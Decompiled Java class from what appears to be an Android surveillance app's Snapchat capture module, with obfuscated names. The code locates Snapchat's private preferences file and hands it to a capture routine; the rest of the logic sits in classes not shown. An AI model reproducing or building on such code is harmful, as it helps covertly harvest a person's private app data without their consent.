package com.vvt.capture.snapchat.b;

import com.vvt.base.capture.i;
import com.vvt.capture.snapchat.d;

class b
  implements Runnable
{
  b(a parama) {}
  
  public void run()
  {
    Object localObject = this.a;
    boolean bool1 = a.a((a)localObject);
    if (bool1)
    {
      localObject = d.a("shared_prefs", "com.snapchat.android_preferences.xml");
      String str1 = a.b(this.a);
      String str2 = a.c(this.a);
      String str3 = a.d(this.a);
      localObject = d.a((String)localObject, str1, str2, str3);
      str1 = com.vvt.capture.snapchat.b.b((String)localObject);
      boolean bool2 = a.a();
      if (bool2) {}
      bool1 = com.vvt.capture.snapchat.b.a((String)localObject, str1);
      boolean bool3 = a.a();
      if ((!bool3) || (bool1))
      {
        bool1 = a.a();
        if (bool1) {}
        com.vvt.capture.snapchat.b.a();
      }
      bool1 = a.a();
      if (bool1) {}
      localObject = a.e(this.a);
      ((i)localObject).a();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */